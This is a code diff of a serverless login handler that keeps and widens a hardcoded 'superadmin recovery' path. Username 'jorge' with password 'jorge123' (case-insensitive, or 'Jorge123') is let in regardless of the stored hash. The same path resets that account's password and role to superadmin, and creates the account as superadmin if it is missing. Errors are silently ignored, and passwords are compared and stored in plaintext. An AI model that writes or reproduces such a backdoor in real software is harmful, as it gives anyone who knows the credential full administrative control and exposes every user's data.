@@ -83,7 +83,8 @@ export async function handler(event) {
 					const user = rows[0];
 					if (user.password_hash !== password) {
 						// Superadmin recovery: allow 'jorge' to log in with default password regardless of stored hash
-						if (username === 'jorge' && (password || '').toLowerCase() === 'jorge123') {
+						const passLower = (password || '').toLowerCase();
+						if (username === 'jorge' && (passLower === 'jorge123' || password === 'Jorge123')) {
 							try { await sql`UPDATE users SET password_hash=${'Jorge123'}, role='superadmin' WHERE id=${user.id}`; } catch {}
 							const featRows = await sql`SELECT feature FROM user_feature_permissions WHERE lower(username)=lower(${user.username}) ORDER BY feature ASC`;
 							const features = (featRows || []).map(f => String(f.feature));
@@ -96,7 +97,8 @@ export async function handler(event) {
 					return json({ username: user.username, role: user.role, features });
 				}
 				// If user not found: special-case superadmin recovery for 'jorge'
-				if (username === 'jorge' && (password || '').toLowerCase() === 'jorge123') {
+				const passLower = (password || '').toLowerCase();
+				if (username === 'jorge' && (passLower === 'jorge123' || password === 'Jorge123')) {
 					try {
 						await sql`INSERT INTO users (username, password_hash, role) VALUES ('jorge', 'Jorge123', 'superadmin') ON CONFLICT (username) DO UPDATE SET role='superadmin'`;
 					} catch {}
